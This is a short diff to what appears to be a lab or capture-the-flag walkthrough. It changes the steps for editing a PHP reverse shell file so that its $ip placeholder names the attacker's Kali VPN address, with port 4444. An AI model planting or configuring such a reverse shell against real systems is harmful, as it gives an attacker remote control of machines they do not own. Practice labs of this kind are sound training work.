@@ -92,9 +92,9 @@ Step 3: Open it in Kali:
 
        nano php-reverse-shell.php
 
-Step 4: Modify these lines with your Kali/AttackBox IP and the port you want to listen on:
+Step 4: Modify these lines with your Kali VPN IP and the port you want to listen on:
 
-      $ip = 'YOUR_KALI_IP';
+      $ip = 'YOUR_KALI_VPN_IP';
       $port = 4444;
       
 Step 5: Save the file (Ctrl + O, Enter, Ctrl + X).
